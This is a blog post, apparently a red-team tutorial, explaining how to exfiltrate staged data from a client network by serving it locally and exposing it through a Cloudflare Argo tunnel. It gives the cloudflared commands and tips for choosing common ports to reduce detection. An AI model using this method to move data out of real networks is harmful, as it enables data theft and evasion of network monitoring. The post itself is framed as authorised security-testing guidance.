---
layout: post
title: Red Teaming with CloudFlare
date: 2021-06-27 13:32:20 +1000
description: You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
img: how-to-start.jpg # Add image post (optional)
#fig-caption: # Add figcaption (optional)
tags: [RedTeam, DataExfil,Security]
---

If you are engaged in a Red Team activity or security assessment and are looking to test the data exfiltration capability you can try making use of CloudFlare’s Argo Tunnel.

Assuming you have completed prior RT activities and have staged your data on a machine that is in your control, you can now, by making use of Argo Tunnels potentially bypass network controls to execute exfiltration activity.
“Argo Tunnel” by Cloudflare allows you to expose an internal web application to internet with a single command on the host/origin system without having to create any firewall rules or using any reverse proxies or static routeable IP addresses etc.

So in our use case, if you can host your target data on a web server running locally on your machine, you can make it accessible from anywhere in the world by making use of argo tunnels. Once the webserver is accessible outside your client’s network you can easily download the data and complete your exfiltration test and log that in your report.

Setting up argo tunnel is fairly straight forward, you need to install cloudflared daemon on the machine where the webserver is running.

Below are step by step instructions for setting your argo tunnel.

### Step 1: Install Cloudflared
In this lab am using a Mac system so we will use homebrew to install the required daemon i.e. “cloudflared”. Bring up ‘terminal’ and execute following command:

$ brew install cloudflare/cloudflare/cloudflared

For detailed instruction on how to install this under other operating systems you may refer to official Cloudflare documentation here

(Optional)Once the installation has completed you may update cloudflared by executing:
$ cloudflared update

### Step 2: Launch WebServer

![Launching python web server]({{site.baseurl}}/assets/img/python1.png)

Note: I have chosen port 9000 for my web server and argo tunnel but you can choose any port of your choice. (You may choose the one that is usually open in other systems in the target environment to keep the noise down).

Open a browser or use “curl localhost:9000” to to confirm the web server is running as expected.
![Browsing directory]({{site.baseurl}}/assets/img/listing1.png)
![Curl output]({{site.baseurl}}/assets/img/curl.png)

This is quick and dirty method to transfer files within the same network boundary however, to transfer data outside the network and over the internet we will make use of cloudflare Argo tunnel. To do this we first start the argo tunnel on the same system.

### Step 3: Start Argo Tunnel
In a a new terminal window execute the following command:

$ cloudflared tunnel –url localhost:9000

This will start argo tunnel which will generate a random subdomain when connecting to the Cloudflare network and print complete URL on screen for you to make use of. Since we supplied the local python server URL and port it will make it accessible from internet through the public URL only known to you. The output will look like following:
![Launching tunnel]({{site.baseurl}}/assets/img/tunnel.png)
Now you should be able to browse the URL returned by argo tunnel from anywhere in the world and download the contents served off this server.
###Step 4: Browse URL from External Network
Copy the URL presented on the terminal and browse it from any part of the world. This will allow you to download any content stored in the directory from where the python web server is running.
![]({{site.baseurl}}/assets/img/listing2.png)

As you can see the resulting URL is https whereas our origin (python )server was only serving over http. So it also adds the transport layer security automatically and uses a trusted certificate from Cloudflare. Moreover you do not need to specify the custom port(9000 in this example) while referencing the webserver as it automatically maps it to port 443.
### Step 5: Clean Up
To stop argo tunnel enter “CTRL +C” in the same terminal window where argo tunnel is running.

To stop python server enter “CTRL +C ” in the same terminal window where python server is running

Argo tunnel is free, you can fire it up without having any account with Cloudflare, no signups no authentication required to get this up and running. There can be many use cases such as customer demos,POC, personal projects etc. Data is served off edge locations from CloudFlare’s massive network and it does not expose your machine’s internal IP or your public IP assigned by your ISP to any client browsers connecting to the public URL.

